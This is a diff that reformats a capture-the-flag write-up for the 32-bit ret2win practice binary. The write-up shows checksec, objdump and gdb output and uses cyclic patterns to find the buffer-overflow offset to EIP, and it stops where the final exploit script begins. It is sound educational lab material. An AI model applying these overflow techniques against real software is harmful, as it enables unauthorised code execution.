@@ -1,6 +1,5 @@
 First of all, use checksec to get some binary information
-
-```
+```shell
 [marco@marco-pc Downloads]$ file ret2win32
 ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=70a25eb0b818fdc0bafabe17e07bccacb8513a53, not stripped
 [marco@marco-pc Downloads]$ checksec --file=ret2win32
@@ -9,9 +8,7 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 ```
 
 The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some information from symbol table
-
-
-```
+```shell
 objdump -t ret2win32
 ...
 080485f6 l     F .text	00000063              pwnme
@@ -22,8 +19,7 @@ objdump -t ret2win32
 There are 2 interesting functions:
 - pwnme, which is called from main, print some strings and get an input;
 - ret2win perfom a system comand "cat flag.txt"
-
-```
+```gdb
 pwndbg> disassemble ret2win 
 Dump of assembler code for function ret2win:
    0x08048659 <+0>:	push   ebp
@@ -47,8 +43,7 @@ pwndbg> x/s 0x8048841
 
 With a buffer overflow we can control the EIP and then we can jump in the ret2win funciton.
 Let's find out how many bytes we need to fill until EIP
-
-```
+```gdb
 pwndbg> cyclic 100
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 
@@ -74,9 +69,6 @@ pwndbg> cyclic -l 'laaa'
 ```
 
 Final exploit:
-
-
-
 ```python
   1 #!/usr/bin/python3
   2 
